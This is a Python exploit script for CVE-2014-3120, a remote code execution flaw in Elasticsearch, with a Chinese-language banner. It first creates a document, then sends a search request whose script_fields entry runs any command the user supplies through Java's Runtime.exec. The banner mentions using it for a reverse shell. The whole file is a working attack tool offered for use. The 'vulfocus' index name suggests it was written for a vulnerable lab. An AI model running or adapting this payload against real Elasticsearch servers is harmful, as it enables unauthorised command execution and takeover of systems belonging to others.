import json
import re
import sys
import requests



def title():
    print("[-------------------------------------------------------------]")
    print("[--------------      Elasticsearch 代码执行      ---------------]")
    print("[--------               CVE-2014-3120              ----------]")
    print("[--------    use:python3 CVE-2014-3120.py url cmd  --------]")
    print("[--------              Author:鸣蜩十四           ------------]")
    print("[-------------------------------------------------------------]")
    print("反弹shell需要经过编码转换")
def main(url,cmd) :
    if (len(sys.argv)==3):
        creat(url,cmd)
    else :
        print("Example: \n   python3 " + sys.argv[0] + " url" +" cmd"+ "\n")

def creat(url,cmd):
    url1 = url + r"/website/blog/"
    headers={
        "User- Agent": "Mozilla / 5.0(Windows NT 10.0; Win64; x64; rv: 76.0) Gecko/20100101 Firefox/76.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    }
    data={
        "name": "vulfocus"
    }
    proxy={
        "http":"http://127.0.0.1:8081"
    }
    s = requests.post(headers=headers,url=url1,data=json.dumps(data),proxies=proxy)
    poc(url,cmd)

def poc(url,cmd) :
    url = url+r"/_search?pretty"
    headers = {
        "User- Agent": "Mozilla / 5.0(Windows NT 10.0; Win64; x64; rv: 76.0) Gecko/20100101 Firefox/76.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    data = {
        "size": 1,
        "query": {
            "filtered": {
                "query": {
                    "match_all": {
                    }
                }
            }
        },
        "script_fields": {
            "command": {
                "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\""+cmd+"\").getInputStream()).useDelimiter(\"\\\\A\").next();"
            }
        }

    }
    proxy = {
        "http": "http://127.0.0.1:8081"
    }
    a = requests.post(headers=headers,url=url,data=json.dumps(data),proxies=proxy)
    print("请查看结果")



if __name__ == "__main__" :
    title()
    url = sys.argv[1]
    cmd = sys.argv[2]
    main(url,cmd)
